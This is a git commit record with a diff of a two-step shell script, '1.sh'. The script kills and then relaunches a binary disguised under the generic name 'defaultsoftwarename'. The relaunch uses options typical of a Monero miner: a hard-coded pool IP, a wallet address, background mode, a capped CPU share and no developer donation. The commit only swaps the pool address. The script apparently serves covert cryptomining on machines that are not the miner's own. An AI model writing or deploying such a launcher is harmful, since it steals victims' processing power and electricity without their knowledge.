77dbb81688348548eb2b354732441382d9683804
alex13932 <59222267+alex13932@users.noreply.github.com>
2020-02-25 03:22:29 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o  194.127.179.25:49228 -u 44GVqaMTxYULCkme3CwT8YNxLcxkPdykmM5ZaGafUbAe3gM93d18vAJPVZzi1udDmjHPUD992fbSUKZfAPCk7uBm85meS4n --pass=x:velat313@mail.ru --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
+defaultsoftwarename -o  77.247.127.233:49228 -u 44GVqaMTxYULCkme3CwT8YNxLcxkPdykmM5ZaGafUbAe3gM93d18vAJPVZzi1udDmjHPUD992fbSUKZfAPCk7uBm85meS4n --pass=x:velat313@mail.ru --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
